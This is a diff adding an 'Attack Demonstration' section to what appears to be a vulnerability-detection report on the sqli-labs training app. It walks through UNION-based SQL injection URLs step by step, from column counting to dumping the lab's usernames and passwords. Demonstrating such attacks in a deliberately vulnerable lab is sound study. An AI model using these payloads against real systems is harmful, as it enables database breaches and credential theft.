@@ -147,6 +147,114 @@ RESULTS BY FILE
 
 ---
 
+## 4. Attack Demonstration
+
+### Detected Vulnerability
+
+| Item | Value |
+|------|-------|
+| File | Less-1/index.php |
+| Line | 29 |
+| Vulnerable Code | `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";` |
+
+The `$id` parameter is directly embedded into the SQL query without sanitization, allowing attackers to manipulate the query structure.
+
+### Attack Scenarios
+
+#### Step 1: Normal Access
+```
+http://localhost/sqli-labs/Less-1/?id=1
+```
+| Login name | Password |
+|------------|----------|
+| Dumb | Dumb |
+
+→ Returns legitimate user data from database.
+
+#### Step 2: Confirm Vulnerability (UNION Injection)
+```
+http://localhost/sqli-labs/Less-1/?id=-1' UNION SELECT 1,2,3--+
+```
+| Login name | Password |
+|------------|----------|
+| 2 | 3 |
+
+→ Injected values `2` and `3` appear in output, confirming SQL injection vulnerability.
+
+**What this reveals:**
+- The original query returns 3 columns (found by trial: `1,2` → error, `1,2,3` → success, `1,2,3,4` → error)
+- Column 2 displays as "Login name", Column 3 displays as "Password"
+- Attackers can place desired data in these positions to extract information
+
+**Key techniques:**
+| Technique | Purpose |
+|-----------|---------|
+| `id=-1` | Non-existent ID returns empty result, so only UNION result is displayed |
+| `--+` | SQL comment to neutralize the rest of original query (attacker doesn't need to know the original code) |
+
+#### Step 3: Extract Database Information
+```
+http://localhost/sqli-labs/Less-1/?id=-1' UNION SELECT 1,user(),database()--+
+```
+| Login name | Password |
+|------------|----------|
+| root@localhost | security |
+
+→ Exposes database username and database name.
+
+**About `user()` and `database()`:**
+- These are MySQL built-in functions (no guessing required - standard in all MySQL installations)
+- Attacker identifies DB type (MySQL/PostgreSQL/MSSQL) first, then uses appropriate standard functions
+
+**Why this matters:**
+- SQL injection executes with the DB connection's user privileges
+- `user()` reveals the current privilege level
+- `root` → High privilege, additional attacks possible (file read/write, etc.)
+- Limited user → Focus on data extraction only
+
+#### Step 4: Extract User Credentials
+```
+http://localhost/sqli-labs/Less-1/?id=-1' UNION SELECT 1,username,password FROM users--+
+```
+| Login name | Password |
+|------------|----------|
+| Dumb | Dumb |
+
+→ Dumps credentials from the `users` table.
+
+#### Step 5: Extract All Users
+```
+http://localhost/sqli-labs/Less-1/?id=-1' UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users--+
+```
+| Login name | Password |
+|------------|----------|
+| Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin | Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin |
+
+→ `GROUP_CONCAT()` aggregates all rows into a single result, bypassing the single-row display limitation.
+
+### Attack Flow Diagram
+```
+Normal Query:
+  SELECT * FROM users WHERE id='1' LIMIT 0,1
+                        　　     ↑
+                        　　 User Input
+
+Injected Query:
+  SELECT * FROM users WHERE id='-1' UNION SELECT 1,username,password FROM users--+' LIMIT 0,1
+                            　　　 ↑                                             ↑
+                             Closes quote                                Comments out rest
+```
+
+### Impact Summary
+
+| Risk | Description |
+|------|-------------|
+| Data Breach | Attacker can extract all data from database |
+| Authentication Bypass | Attacker can retrieve user credentials |
+| Privilege Escalation | Database user/configuration exposed |
+| Further Attacks | If root, file read/write operations possible |
+---
+
 ## Conclusion
 
 - ✓ Primary vulnerability correctly detected (Line 29)
